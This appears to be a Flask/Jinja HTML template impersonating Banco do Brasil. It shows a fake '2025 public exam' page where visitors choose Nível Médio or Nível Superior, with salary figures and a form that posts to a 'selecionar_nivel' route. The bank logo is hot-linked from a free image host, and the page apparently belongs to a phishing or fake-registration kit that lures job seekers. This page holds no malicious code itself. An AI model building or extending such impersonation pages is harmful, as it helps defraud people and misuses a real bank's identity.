<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco do Brasil - Seleção de Nível</title>

    <!-- Preload fonts -->
    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-400.woff2') }}" as="font" type="font/woff2" crossorigin>
    <link rel="preload" href="{{ url_for('static', filename='fonts/rawline-700.woff2') }}" as="font" type="font/woff2" crossorigin>

    <!-- Styles -->
    <link href="{{ url_for('static', filename='css/rawline.css') }}" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">

    <style>
        body {
            font-family: 'rawline', sans-serif;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }
    </style>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'bb-yellow': '#FEEF37',
                        'bb-blue': '#003DA5',
                    }
                }
            }
        }
    </script>
</head>
<body class="bg-gray-50 min-h-screen flex flex-col">
    <div class="bg-bb-yellow py-4 shadow-sm">
        <div class="container mx-auto px-4">
            <div class="flex flex-col items-center text-center">
                <img src="https://i.ibb.co/WvBH03fD/png-transparent-banco-do-brasil-hd-logo-thumbnail-removebg-preview-1.png" alt="Logo do Banco do Brasil" class="h-12 mb-2" />
                <div>
                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
                        CONCURSO PÚBLICO 2025
                    </p>
                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
                        SELEÇÃO EXTERNA PARA CARREIRA ADMINISTRATIVA
                    </p>
                </div>
            </div>
        </div>
    </div>

    <!-- Blue bar -->
    <div class="bg-bb-blue py-3 shadow-md">
        <div class="container mx-auto px-4 flex items-center">
            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
                <div class="w-2 h-2 bg-white"></div>
                <div class="w-2 h-2 bg-white"></div>
                <div class="w-2 h-2 bg-white"></div>
                <div class="w-2 h-2 bg-white"></div>
            </div>
            <span class="text-white text-xl tracking-wide drop-shadow-sm">SELEÇÃO DE NÍVEL</span>
        </div>
    </div>

    <!-- Main Content -->
    <div class="container mx-auto px-4 py-8 flex-grow">
        <div class="max-w-2xl mx-auto">
            <div class="bg-white rounded-lg shadow-md p-6">
                <div class="mb-6">
                    <h2 class="text-lg font-bold text-bb-blue mb-2">Selecione o Nível de Escolaridade</h2>
                    <p class="text-gray-600">Escolha o nível para o qual deseja se candidatar:</p>
                </div>

                <form action="{{ url_for('selecionar_nivel') }}" method="POST" class="space-y-6">
                    <div class="space-y-4">
                        <!-- Nível Médio -->
                        <label class="block p-4 border rounded-lg hover:bg-gray-50 cursor-pointer transition-colors">
                            <div class="flex items-start">
                                <input type="radio" name="nivel" value="medio" class="mt-1 h-4 w-4 text-bb-blue focus:ring-bb-blue" required>
                                <div class="ml-3">
                                    <span class="block font-bold text-gray-900">Nível Médio</span>
                                    <span class="block text-sm text-gray-700 mt-1">Salário Inicial: R$ 3.622,23</span>
                                    <span class="block text-sm text-gray-700">Salário Final: R$ 5.684,00</span>
                                    <span class="block text-sm text-green-600 font-medium mt-1">+ R$ 1.600,00 em benefícios</span>
                                </div>
                            </div>
                        </label>

                        <!-- Nível Superior -->
                        <label class="block p-4 border rounded-lg hover:bg-gray-50 cursor-pointer transition-colors">
                            <div class="flex items-start">
                                <input type="radio" name="nivel" value="superior" class="mt-1 h-4 w-4 text-bb-blue focus:ring-bb-blue" required>
                                <div class="ml-3">
                                    <span class="block font-bold text-gray-900">Nível Superior</span>
                                    <span class="block text-sm text-gray-500">(Qualquer curso superior)</span>
                                    <span class="block text-sm text-gray-700 mt-1">Salário Inicial: R$ 9.624,40</span>
                                    <span class="block text-sm text-gray-700">Salário Final: R$ 21.432,28</span>
                                    <span class="block text-sm text-green-600 font-medium mt-1">+ R$ 1.600,00 em benefícios</span>
                                </div>
                            </div>
                        </label>
                    </div>

                    <button type="submit" class="w-full bg-bb-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200">
                        <span>Continuar</span>
                        <i class="fas fa-arrow-right ml-2"></i>
                    </button>
                </form>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div class="bg-bb-yellow text-bb-blue text-center py-4 mt-auto shadow-inner">
        <p class="text-sm font-medium">© {{ current_year }} Banco do Brasil S.A. Todos os direitos reservados.</p>
        <p class="text-sm mt-1">Central de Atendimento BB - 0800 729 0722</p>
    </div>
</body>
</html>
